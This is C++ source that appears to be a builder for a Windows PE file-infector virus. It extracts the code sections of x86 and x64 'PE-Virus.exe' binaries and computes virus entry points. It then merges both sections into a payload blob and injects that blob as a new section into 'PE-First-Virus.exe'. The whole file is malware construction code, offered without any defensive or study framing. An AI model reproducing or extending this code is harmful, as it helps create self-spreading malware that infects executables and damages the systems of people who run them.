#include "virus/viruscpp.h"

#include <filesystem>
#include <fstream>
#include <iostream>
#include <vector>

using namespace std;

void AddVirusToFile(void* a, unsigned long b, struct _DATA* c, unsigned long* d)
{
    return;
}

#define MAIN_ENTRY_POINT_X86 0x2d30
#define MAIN_ENTRY_POINT_X64 0x3470

int main(int argc, char *argv[]) {
    string path;
    std::filesystem::path cwd = std::filesystem::current_path();
    path = cwd.string();
    if (path.substr(path.size() - 5, path.size()) == "\\main")
    {
        path = path.substr(0, path.size() - 4);
    }
    else
    {
        return 0;
    }
	
    pe::PortableExecutable file_x86(path + "file\\virusexe\\x86\\PE-Virus.exe");
	pe::PortableExecutable file_x64(path + "file\\virusexe\\x64\\PE-Virus.exe");

	pe::SECTION code_section_x86 = file_x86.GetCodeSectionOfEntryPoint();
	pe::SECTION code_section_x64 = file_x64.GetCodeSectionOfEntryPoint();

	DWORD virus_entry_point_x86 = MAIN_ENTRY_POINT_X86 + 8 - code_section_x86.header.VirtualAddress;
	DWORD virus_entry_point_x64 = MAIN_ENTRY_POINT_X64 + 8 + code_section_x86.header.SizeOfRawData - code_section_x64.header.VirtualAddress;
	
    vector<unsigned char> merge;

    merge.resize(8);
	memcpy(&merge[0], &virus_entry_point_x86, sizeof(DWORD));
	memcpy(&merge[4], &virus_entry_point_x64, sizeof(DWORD));

    std::copy (code_section_x86.data.begin(), code_section_x86.data.end(), std::back_inserter(merge));
    std::copy (&code_section_x64.data[0], &code_section_x64.data[code_section_x64.data.size() - 0x8], std::back_inserter(merge));

    ofstream ofs(path + "file\\virusbody\\virus_code_section", std::ios_base::binary);
    ofs.write((char*)&merge[0], merge.size());
    ofs.close();

	virus::PeVirus virus_file(path + "file\\firstvirus\\PE-First-Virus.exe");
	virus_file.AddVirusSection(merge);
	virus_file.FlushChange();
}
